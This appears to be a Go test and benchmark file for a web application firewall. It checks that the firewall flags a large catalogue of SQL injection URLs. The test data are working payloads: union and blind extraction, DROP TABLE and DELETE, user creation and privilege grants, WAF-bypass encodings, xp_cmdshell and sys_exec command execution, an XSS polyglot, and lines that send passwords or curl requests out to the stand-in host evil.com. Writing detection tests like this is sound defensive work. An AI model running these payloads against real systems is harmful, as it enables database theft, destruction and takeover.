package benchmarks

import (
	"net/http/httptest"
	"rhinowaf/waf/sanitize"
	"testing"
)

func TestSQLInjectionComprehensive(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
		category string
	}{
		// Clean inputs
		{"Clean ID", "/?id=123", false, "clean"},
		{"Clean name", "/?name=john", false, "clean"},
		{"Clean email", "/?email=test@example.com", false, "clean"},
		{"Clean search", "/?q=hello+world", false, "clean"},
		{"Clean numbers", "/?price=19.99&qty=5", false, "clean"},
		{"Clean path", "/?path=/home/user/docs", false, "clean"},
		{"Clean date", "/?date=2025-11-05", false, "clean"},
		{"Clean UUID", "/?id=550e8400-e29b-41d4-a716-446655440000", false, "clean"},

		// Basic SQL injection
		{"OR 1=1", "/?id=1'+OR+'1'='1", true, "basic"},
		{"OR true", "/?id=1'+OR+true", true, "basic"},
		{"OR 'x'='x'", "/?id=1'+OR+'x'='x", true, "basic"},
		{"AND 1=1", "/?id=1'+AND+'1'='1", true, "basic"},
		{"Double dash comment", "/?id=1'--", true, "basic"},
		{"Hash comment", "/?id=1'%23", true, "basic"},
		{"Semicolon terminator", "/?id=1';", true, "basic"},

		// Union-based injection
		{"UNION SELECT basic", "/?id=1+UNION+SELECT+*", true, "union"},
		{"UNION ALL SELECT", "/?id=1+UNION+ALL+SELECT+1,2,3", true, "union"},
		{"UNION SELECT users", "/?id=1+UNION+SELECT+username,password+FROM+users", true, "union"},
		{"UNION NULL columns", "/?id=1+UNION+SELECT+NULL,NULL,NULL", true, "union"},
		{"UNION with concat", "/?id=1+UNION+SELECT+CONCAT(user,0x3a,pass)", true, "union"},
		{"Nested UNION", "/?id=1+UNION+(SELECT+1+UNION+SELECT+2)", true, "union"},

		// Boolean-based blind
		{"Boolean AND true", "/?id=1'+AND+'1'='1'--", true, "boolean"},
		{"Boolean AND false", "/?id=1'+AND+'1'='2'--", true, "boolean"},
		{"Boolean substring", "/?id=1'+AND+SUBSTRING(version(),1,1)='5'--", true, "boolean"},
		{"Boolean ASCII", "/?id=1'+AND+ASCII(SUBSTRING((SELECT+password),1,1))>100--", true, "boolean"},
		{"Boolean length", "/?id=1'+AND+LENGTH(database())>0--", true, "boolean"},

		// Time-based blind
		{"SLEEP function", "/?id=1'+AND+SLEEP(5)--", true, "time"},
		{"WAITFOR DELAY", "/?id=1'+WAITFOR+DELAY+'00:00:05'--", true, "time"},
		{"BENCHMARK", "/?id=1'+AND+BENCHMARK(5000000,MD5('test'))--", true, "time"},
		{"pg_sleep", "/?id=1'+AND+pg_sleep(5)--", true, "time"},
		{"IF with SLEEP", "/?id=1'+AND+IF(1=1,SLEEP(5),0)--", true, "time"},

		// Error-based injection
		{"UpdateXML error", "/?id=1'+AND+updatexml(null,concat(0x0a,version()),null)--", true, "error"},
		{"ExtractValue error", "/?id=1'+AND+extractvalue(1,concat(0x7e,database()))--", true, "error"},
		{"CONVERT error", "/?id=1'+AND+1=CONVERT(int,(SELECT+@@version))--", true, "error"},
		{"Type mismatch", "/?id=1'+AND+'a'=1--", true, "error"},

		// Stacked queries
		{"Stacked DELETE", "/?id=1;+DELETE+FROM+users", true, "stacked"},
		{"Stacked DROP", "/?id=1;+DROP+TABLE+users", true, "stacked"},
		{"Stacked UPDATE", "/?id=1;+UPDATE+users+SET+password='hacked'", true, "stacked"},
		{"Stacked INSERT", "/?id=1;+INSERT+INTO+admins+VALUES('hacker','pass')", true, "stacked"},
		{"Multiple stacked", "/?id=1;+DELETE+FROM+logs;+DROP+TABLE+audit", true, "stacked"},

		// Order/Group by injection
		{"ORDER BY column", "/?id=1+ORDER+BY+1--", true, "order"},
		{"ORDER BY number", "/?id=1+ORDER+BY+5--", true, "order"},
		{"GROUP BY injection", "/?id=1+GROUP+BY+1--", true, "order"},
		{"ORDER BY with UNION", "/?id=1+ORDER+BY+1+UNION+SELECT+NULL--", true, "order"},

		// Comment variations
		{"Multi-line comment", "/?id=1/**/OR/**/1=1", true, "comment"},
		{"Inline comment", "/?id=1'/*comment*/OR/**/1=1--", true, "comment"},
		{"Hash comment", "/?id=1'+OR+1=1%23", true, "comment"},
		{"Double dash space", "/?id=1'+OR+1=1--+", true, "comment"},

		// Encoding evasion
		{"URL encoded quote", "/?id=1%27+OR+1=1", true, "encoding"},
		{"Double URL encoded", "/?id=1%2527+OR+1=1", true, "encoding"},
		{"Unicode encoding", "/?id=1%u0027+OR+1=1", true, "encoding"},
		{"Hex encoded", "/?id=0x61646d696e", true, "encoding"},
		{"Char function", "/?id=CHAR(97,100,109,105,110)", true, "encoding"},

		// Case variations
		{"Uppercase OR", "/?id=1'+OR+'1'='1", true, "case"},
		{"Mixed case SELECT", "/?id=1+UnIoN+SeLeCt+1,2,3", true, "case"},
		{"Lowercase union", "/?id=1+union+select+null", true, "case"},

		// Advanced techniques
		{"EXEC/EXECUTE", "/?id=1';+EXEC+xp_cmdshell+'dir'--", true, "advanced"},
		{"INTO OUTFILE", "/?id=1'+INTO+OUTFILE+'/tmp/hack.txt'--", true, "advanced"},
		{"LOAD_FILE", "/?id=1'+AND+LOAD_FILE('/etc/passwd')--", true, "advanced"},
		{"xp_cmdshell", "/?id=1';+EXEC+master..xp_cmdshell+'ping+evil.com'--", true, "advanced"},
		{"Stored procedure", "/?id=1';+EXEC+sp_executesql+N'SELECT+*'--", true, "advanced"},

		// String concatenation
		{"MySQL concat", "/?id=1'+AND+CONCAT('a','b')='ab'--", true, "concat"},
		{"MSSQL concat", "/?id=1'+AND+'a'+'b'='ab'--", true, "concat"},
		{"Oracle concat", "/?id=1'+AND+'a'||'b'='ab'--", true, "concat"},
		{"Concat with UNION", "/?id=1+UNION+SELECT+CONCAT(user,':',pass)", true, "concat"},

		// Database fingerprinting
		{"MySQL version", "/?id=1'+AND+@@version--", true, "fingerprint"},
		{"MSSQL version", "/?id=1'+AND+@@version>0--", true, "fingerprint"},
		{"PostgreSQL version", "/?id=1'+AND+version()>0--", true, "fingerprint"},
		{"Database name", "/?id=1'+AND+database()='test'--", true, "fingerprint"},
		{"Current user", "/?id=1'+AND+user()='root'--", true, "fingerprint"},

		// Second-order injection
		{"Insert malicious", "/?name=admin'--", true, "second-order"},
		{"Update malicious", "/?bio='+OR+1=1--", true, "second-order"},

		// NoSQL injection attempts (should still catch)
		{"MongoDB injection", "/?id[$ne]=1", true, "nosql"},
		{"MongoDB regex", "/?user[$regex]=^admin", true, "nosql"},

		// Obfuscation techniques
		{"Space to comment", "/?id=1'/**/OR/**/1=1", true, "obfuscation"},
		{"Tab separator", "/?id=1'%09OR%091=1", true, "obfuscation"},
		{"Newline separator", "/?id=1'%0AOR%0A1=1", true, "obfuscation"},
		{"Multiple spaces", "/?id=1'+OR++1=1", true, "obfuscation"},

		// Function-based injection
		{"SUBSTRING extract", "/?id=1'+AND+SUBSTRING(password,1,1)='a'--", true, "function"},
		{"ASCII extraction", "/?id=1'+AND+ASCII(SUBSTRING(password,1,1))=97--", true, "function"},
		{"MID function", "/?id=1'+AND+MID(password,1,1)='a'--", true, "function"},
		{"LEFT function", "/?id=1'+AND+LEFT(password,1)='a'--", true, "function"},

		// Nested queries
		{"Nested SELECT", "/?id=1'+AND+(SELECT+1+FROM+users)=1--", true, "nested"},
		{"Subquery in WHERE", "/?id=1'+AND+id=(SELECT+MIN(id)+FROM+users)--", true, "nested"},
		{"EXISTS clause", "/?id=1'+AND+EXISTS(SELECT+*+FROM+users)--", true, "nested"},

		// Privilege escalation
		{"GRANT command", "/?id=1';+GRANT+ALL+ON+*.*+TO+'hacker'--", true, "privilege"},
		{"Create user", "/?id=1';+CREATE+USER+'hacker'@'%'+IDENTIFIED+BY+'pass'--", true, "privilege"},
		{"ALTER user", "/?id=1';+ALTER+USER+'root'@'localhost'+IDENTIFIED+BY+'hacked'--", true, "privilege"},

		// WAF bypass techniques
		{"Double encoding", "/?id=1%2527+OR+%25271%2527=%25271", true, "bypass"},
		{"Case randomization", "/?id=1'+oR+'1'='1", true, "bypass"},
		{"Comment injection", "/?id=1'/**/UnIoN/**/SeLeCt/**/1,2,3--", true, "bypass"},
		{"Null byte", "/?id=1%00'+OR+1=1--", true, "bypass"},

		// Batch/multi-statement
		{"Batch with semicolon", "/?id=1;SELECT+SLEEP(5)", true, "batch"},
		{"Multiple queries", "/?id=1';DROP+TABLE+users;SELECT+'hacked", true, "batch"},

		// Information schema
		{"Schema tables", "/?id=1+UNION+SELECT+table_name+FROM+information_schema.tables", true, "schema"},
		{"Schema columns", "/?id=1+UNION+SELECT+column_name+FROM+information_schema.columns", true, "schema"},
		{"Schema databases", "/?id=1+UNION+SELECT+schema_name+FROM+information_schema.schemata", true, "schema"},

		// Tautology-based
		{"True tautology", "/?user=admin'+OR+'1'='1'--&pass=any", true, "tautology"},
		{"Numeric tautology", "/?id=1+OR+1=1--", true, "tautology"},
		{"String tautology", "/?name=''+OR+''='", true, "tautology"},

		// Out-of-band
		{"DNS exfil MySQL", "/?id=1'+AND+LOAD_FILE(CONCAT('\\\\',(SELECT+password),'.evil.com\\\\a'))", true, "oob"},
		{"DNS exfil MSSQL", "/?id=1';EXEC+master..xp_dirtree+'\\\\'+password+'.evil.com\\a'--", true, "oob"},

		// Truncation attacks
		{"Long string truncate", "/?name=admin'+/*comment*/--", true, "truncation"},

		// Advanced evasion techniques
		{"Scientific notation", "/?id=1e1+OR+1e1=1e1--", true, "evasion"},
		{"Tab newline mix", "/?id=1'%09AND%0D%0A'1'='1", true, "evasion"},
		{"Reverse comment", "/?id=1'||'1'='1'/**/--", true, "evasion"},
		{"Parenthesis obfuscation", "/?id=(1)or(1)=(1)", true, "evasion"},
		{"Bitwise operators", "/?id=1^0+OR+1&1", true, "evasion"},
		{"String concat bypass", "/?id=1'+'1'='2'OR'1'='1", true, "evasion"},
		{"LIKE wildcard", "/?id=admin'+AND+'1'LIKE'1", true, "evasion"},

		// JSON injection
		{"JSON OR injection", "/?filter={\"id\":\"1'+OR+'1'='1\"}", true, "json"},
		{"JSON nested", "/?data={\"user\":{\"id\":\"1+UNION+SELECT+NULL\"}}", true, "json"},
		{"JSON array", "/?ids=[\"1\",\"2'+UNION+SELECT+password--\"]", true, "json"},

		// Second-order timing
		{"Conditional response", "/?id=1'+AND+IF(LENGTH(password)>5,1,0)--", true, "second-order"},
		{"Binary search leak", "/?id=1'+AND+ASCII(SUBSTRING(password,1,1))>100--", true, "second-order"},

		// HTTP parameter pollution
		{"HPP duplicate params", "/?id=1&id='+OR+'1'='1", true, "hpp"},
		{"HPP array notation", "/?id[]=1&id[]='+UNION+SELECT+NULL--", true, "hpp"},

		// Polyglot attacks
		{"Polyglot multi-DB", "/?id=1'||'1'='1'--'+OR+'1'='1'/**/--", true, "polyglot"},
		{"XSS-SQL polyglot", "/?q='><script>alert(1)</script>'+OR+'1'='1'--", true, "polyglot"},

		// Column truncation
		{"Truncation overflow", "/?user=admin'+OR+1=1--+AAAAAAAAAAAAAAAAAAAAAAAAAAAA", true, "truncation"},
		{"Comment truncation", "/?name=admin'/*verylongcommentAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*/--", true, "truncation"},

		// Conditional timing
		{"CASE WHEN timing", "/?id=1'+AND+CASE+WHEN+(1=1)+THEN+SLEEP(5)+END--", true, "timing"},
		{"IIF timing MSSQL", "/?id=1';IF(1=1)+WAITFOR+DELAY+'00:00:05'--", true, "timing"},

		// Stored procedure abuse
		{"MySQL sys_exec", "/?id=1';SELECT+sys_exec('whoami')--", true, "stored-proc"},
		{"PostgreSQL copy", "/?id=1';COPY+(SELECT+'')TO+PROGRAM+'curl+evil.com'--", true, "stored-proc"},

		// Type juggling
		{"Integer string compare", "/?id=0x61646d696e", true, "type-juggling"},
		{"Float comparison", "/?id=1.0+OR+1.0=1.0", true, "type-juggling"},
		{"Scientific in condition", "/?id=1e0+AND+1e0=1e0", true, "type-juggling"},

		// GraphQL injection
		{"GraphQL mutation", "/?query={user(id:\"1'+OR+'1'='1\"){name}}", true, "graphql"},
		{"GraphQL fragment", "/?query=fragment+on+User{...on+User{id}}'+OR+'1'='1", true, "graphql"},

		// XML-based injection
		{"XML entity", "/?xml=<user><id>1'+OR+'1'='1</id></user>", true, "xml"},
		{"XPATH injection", "/?xpath=//user[id='1'+or+'1'='1']", true, "xml"},

		// Charset manipulation
		{"UTF-7 encoded", "/?id=+ADsAZAByAG8AcAAgAHQAYQBiAGwAZQ--", true, "charset"},
		{"UTF-16 bypass", "/?id=%00%27%00+%00O%00R%00+%00%31%00=%00%31", true, "charset"},

		// Logical operator abuse
		{"XOR tautology", "/?id=1'+XOR+'1'='2'+XOR+'1'='1", true, "logic"},
		{"NOT NOT bypass", "/?id=1'+AND+NOT+NOT+1=1--", true, "logic"},
		{"Between abuse", "/?id=1'+AND+'a'+BETWEEN+'a'+AND+'z", true, "logic"},

		// Uncommon functions
		{"SOUNDEX comparison", "/?name=admin'+AND+SOUNDEX(user)=SOUNDEX('admin')--", true, "uncommon"},
		{"REGEXP injection", "/?id=1'+AND+user+REGEXP+'^admin'--", true, "uncommon"},
		{"GREATEST function", "/?id=GREATEST(1,2)+OR+1=1--", true, "uncommon"},

		// Database-specific tricks
		{"MySQL hex literals", "/?id=0x273b44524f50205441424c45207573657273", true, "db-specific"},
		{"MSSQL master table", "/?id=1'+UNION+SELECT+*+FROM+master..sysdatabases--", true, "db-specific"},
		{"Oracle dual table", "/?id=1'+UNION+SELECT+NULL+FROM+dual--", true, "db-specific"},
		{"PostgreSQL version comment", "/?id=1'/*PostgreSQL*/||'1'='1'--", true, "db-specific"},

		// Race condition vectors
		{"Transaction injection", "/?id=1';START+TRANSACTION;DELETE+FROM+users;COMMIT--", true, "race"},
		{"Lock table attack", "/?id=1';LOCK+TABLES+users+WRITE--", true, "race"},
	}

	results := make(map[string]struct {
		total    int
		detected int
		missed   []string
	})

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tt.input, nil)
			result := sanitize.IsMalicious(req)

			if results[tt.category].total == 0 {
				results[tt.category] = struct {
					total    int
					detected int
					missed   []string
				}{0, 0, []string{}}
			}

			r := results[tt.category]
			r.total++

			if result != tt.expected {
				if tt.expected && !result {
					t.Errorf("MISSED %s: %s", tt.category, tt.name)
					r.missed = append(r.missed, tt.name)
				} else {
					t.Errorf("FALSE POSITIVE: %s", tt.name)
				}
			} else if result && tt.expected {
				r.detected++
			}

			results[tt.category] = r
		})
	}

	t.Log("\n=== SQL Injection Detection Summary ===")
	totalTests := 0
	totalMalicious := 0
	totalDetected := 0
	totalMissed := 0

	for category, stats := range results {
		maliciousCount := 0
		for _, tt := range tests {
			if tt.category == category && tt.expected {
				maliciousCount++
			}
		}

		detectionRate := 0.0
		if maliciousCount > 0 {
			detectionRate = float64(stats.detected) / float64(maliciousCount) * 100
		}

		missed := len(stats.missed)
		t.Logf("\n%s:", category)
		t.Logf("  Total tests: %d", stats.total)
		t.Logf("  Malicious samples: %d", maliciousCount)
		t.Logf("  Detected: %d", stats.detected)
		t.Logf("  Missed: %d", missed)
		t.Logf("  Detection rate: %.2f%%", detectionRate)

		if len(stats.missed) > 0 && len(stats.missed) <= 5 {
			t.Logf("  Missed attacks: %v", stats.missed)
		}

		totalTests += stats.total
		totalMalicious += maliciousCount
		totalDetected += stats.detected
		totalMissed += missed
	}

	overallRate := 0.0
	if totalMalicious > 0 {
		overallRate = float64(totalDetected) / float64(totalMalicious) * 100
	}

	t.Logf("\n=== Overall Results ===")
	t.Logf("Total tests: %d", totalTests)
	t.Logf("Total malicious: %d", totalMalicious)
	t.Logf("Total detected: %d", totalDetected)
	t.Logf("Total missed: %d", totalMissed)
	t.Logf("Overall detection rate: %.2f%%", overallRate)

	if overallRate < 75.0 {
		t.Logf("\nWARNING: Detection rate below 75%% - consider improving SQL injection filters")
	}
}

func BenchmarkSQLInjectionDetectionSpeed(b *testing.B) {
	testCases := []string{
		"/?id=1'+OR+'1'='1",
		"/?id=1+UNION+SELECT+*+FROM+users",
		"/?id=1;+DROP+TABLE+users",
		"/?id=1'+AND+SLEEP(5)--",
		"/?id=1+ORDER+BY+1--",
	}

	b.Run("Individual", func(b *testing.B) {
		for _, tc := range testCases {
			b.Run(tc[5:20], func(b *testing.B) {
				req := httptest.NewRequest("GET", tc, nil)
				b.ResetTimer()
				b.ReportAllocs()
				for i := 0; i < b.N; i++ {
					_ = sanitize.IsMalicious(req)
				}
			})
		}
	})

	b.Run("Mixed", func(b *testing.B) {
		reqs := make([]*httptest.ResponseRecorder, len(testCases))
		for i, tc := range testCases {
			reqs[i] = httptest.NewRecorder()
			_ = httptest.NewRequest("GET", tc, nil)
		}
		b.ResetTimer()
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			idx := i % len(testCases)
			req := httptest.NewRequest("GET", testCases[idx], nil)
			_ = sanitize.IsMalicious(req)
		}
	})
}

func TestSQLInjectionByDatabase(t *testing.T) {
	tests := map[string][]struct {
		name  string
		input string
	}{
		"MySQL": {
			{"MySQL version", "/?id=1'+AND+@@version--"},
			{"MySQL concat", "/?id=1'+AND+CONCAT('a','b')='ab'--"},
			{"MySQL sleep", "/?id=1'+AND+SLEEP(5)--"},
			{"MySQL benchmark", "/?id=1'+AND+BENCHMARK(1000000,MD5('test'))--"},
			{"MySQL into outfile", "/?id=1'+INTO+OUTFILE+'/tmp/test.txt'--"},
			{"MySQL load file", "/?id=1'+UNION+SELECT+LOAD_FILE('/etc/passwd')--"},
		},
		"MSSQL": {
			{"MSSQL version", "/?id=1'+AND+@@version>0--"},
			{"MSSQL waitfor", "/?id=1'+WAITFOR+DELAY+'00:00:05'--"},
			{"MSSQL xp_cmdshell", "/?id=1';+EXEC+xp_cmdshell+'dir'--"},
			{"MSSQL sp_executesql", "/?id=1';+EXEC+sp_executesql+N'SELECT+*'--"},
			{"MSSQL concat", "/?id=1'+AND+'a'+'b'='ab'--"},
		},
		"PostgreSQL": {
			{"PostgreSQL version", "/?id=1'+AND+version()>0--"},
			{"PostgreSQL sleep", "/?id=1'+AND+pg_sleep(5)--"},
			{"PostgreSQL concat", "/?id=1'+AND+'a'||'b'='ab'--"},
			{"PostgreSQL copy", "/?id=1';+COPY+(SELECT+*)+TO+'/tmp/test'--"},
		},
		"Oracle": {
			{"Oracle version", "/?id=1'+AND+banner+LIKE+'Oracle%'--"},
			{"Oracle concat", "/?id=1'+AND+'a'||'b'='ab'--"},
			{"Oracle dbms_pipe", "/?id=1'+AND+dbms_pipe.receive_message('a',5)>0--"},
			{"Oracle UTL_HTTP", "/?id=1'+AND+UTL_HTTP.request('http://evil.com')>0--"},
		},
	}

	for dbType, dbTests := range tests {
		t.Run(dbType, func(t *testing.T) {
			detected := 0
			for _, tt := range dbTests {
				t.Run(tt.name, func(t *testing.T) {
					req := httptest.NewRequest("GET", tt.input, nil)
					if sanitize.IsMalicious(req) {
						detected++
					} else {
						t.Errorf("MISSED: %s", tt.name)
					}
				})
			}
			rate := float64(detected) / float64(len(dbTests)) * 100
			t.Logf("%s detection rate: %.2f%% (%d/%d)", dbType, rate, detected, len(dbTests))
		})
	}
}
